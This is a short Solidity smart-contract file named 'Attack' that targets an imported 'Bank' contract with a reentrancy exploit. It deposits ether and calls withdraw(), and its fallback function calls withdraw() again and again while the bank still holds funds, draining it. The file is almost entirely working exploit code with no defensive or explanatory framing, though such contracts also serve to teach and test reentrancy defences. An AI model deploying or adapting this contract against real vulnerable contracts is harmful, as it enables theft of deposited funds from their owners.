// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;

import "./Bank.sol";

contract Attack {
    Bank public bank;

    constructor(address _bankAddress){
        bank = Bank(_bankAddress);
    }

    fallback() external payable{
        if(address(bank).balance>0){
            bank.withdraw();
        }
    }
    
    function attack() public payable{
        bank.deposit{value:msg.value}();
        bank.withdraw();
    }
    
    function checkBalance() view public returns(uint){
        return address(this).balance;
    }
}
